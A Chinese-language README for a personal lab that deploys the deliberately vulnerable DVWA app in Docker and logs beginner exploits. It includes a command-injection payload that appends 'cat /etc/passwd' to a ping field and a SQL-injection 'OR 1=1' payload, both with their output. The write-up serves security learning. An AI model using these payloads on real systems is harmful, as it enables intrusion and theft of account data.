# 🛡️ Web 安全与 AI 应用实战实验室

本项目记录了我从零开始搭建 Web 渗透测试环境（DVWA）以及本地大模型（RAG）的实战过程。包含环境部署配置、漏洞复现记录以及避坑指南。

## 🛠️ 技术栈
- **运行环境**：VirtualBox + Kali Linux
- **容器化部署**：Docker
- **核心靶场**：DVWA (Damn Vulnerable Web Application)
- **AI 组件**：Ollama + LangChain + Qwen2.5（本地 RAG 知识库）

## 📦 渗透环境快速启动

由于国内网络拉取 Docker 镜像极易受限，本项目采用 1Panel 镜像源进行加速部署。

\`\`\`bash
# 1. 停止可能冲突的本地服务
sudo systemctl stop apache2
sudo systemctl stop mariadb

# 2. 启动 DVWA 靶场 (占用 80 端口)
sudo docker run -d --name dvwa -p 80:80 docker.1panel.live/vulnerables/web-dvwa
\`\`\`

访问 `http://127.0.0.1` 即可进入靶场。默认账号 `admin` / 密码 `password`。

## 💥 漏洞复现记录 (Low 难度)

### 1. Command Injection (命令注入)
- **Payload**: `127.0.0.1; cat /etc/passwd`
- **原理**: 网页底层直接拼接用户输入，利用英文分号 `;` 绕过限制，执行任意系统命令。
- **战果**: 成功读取 Linux 系统所有用户密码文件。

### 2. SQL Injection (SQL 注入)
- **Payload**: `1' OR '1'='1`
- **原理**: 利用逻辑判断 `'1'='1'` 恒为真，绕过身份验证，导致数据库全量信息泄露（脱库）。
- **战果**: 成功获取靶场所有用户账户及密码哈希。

## ⚠️ 踩坑记录 (避坑指南)
1. **Docker 镜像拉取失败**：国内官方源已被墙，需替换为 `docker.1panel.live` 等可用镜像源。
2. **数据库连接 500 错误**：DVWA 源码默认路径及 PHP 8.4 兼容性问题，最终采用 Docker 容器化一劳永逸解决。
3. **虚拟机网卡掉线**：VirtualBox 的 NAT 模式易受 Windows 宿主代理软件影响，需关闭宿主机网络代理。
\`\`\`text

1. Command Injection (命令注入) 战果
Payload: 127.0.0.1; cat /etc/passwd

执行结果:
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.034 ms
...
4 packets transmitted, 4 packets received, 0% packet loss
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
... (成功读取系统所有用户)

2. SQL Injection (SQL 注入) 战果
Payload: 1' OR '1'='1

执行结果:
ID: 1' OR '1'='1
First name: admin
Surname: admin
ID: 1' OR '1'='1
First name: Gordon
Surname: Brown
ID: 1' OR '1'='1
First name: Hack
Surname: Me
ID: 1' OR '1'='1
First name: Pablo
<img width="1279" height="1516" alt="微信图片_20261026115534_173_173" src="https://github.com/user-attachments/assets/93fde081-6ab9-45a7-8b74-52375bd3d6cb" />
Surname: Picasso
ID: 1' OR '1'='1
First name: Bob
Surname: Smith
... (成功导致数据库全量泄露)
\`\`\`
![Uploading 微信图片_20261026115534_173_173.jpg…]()
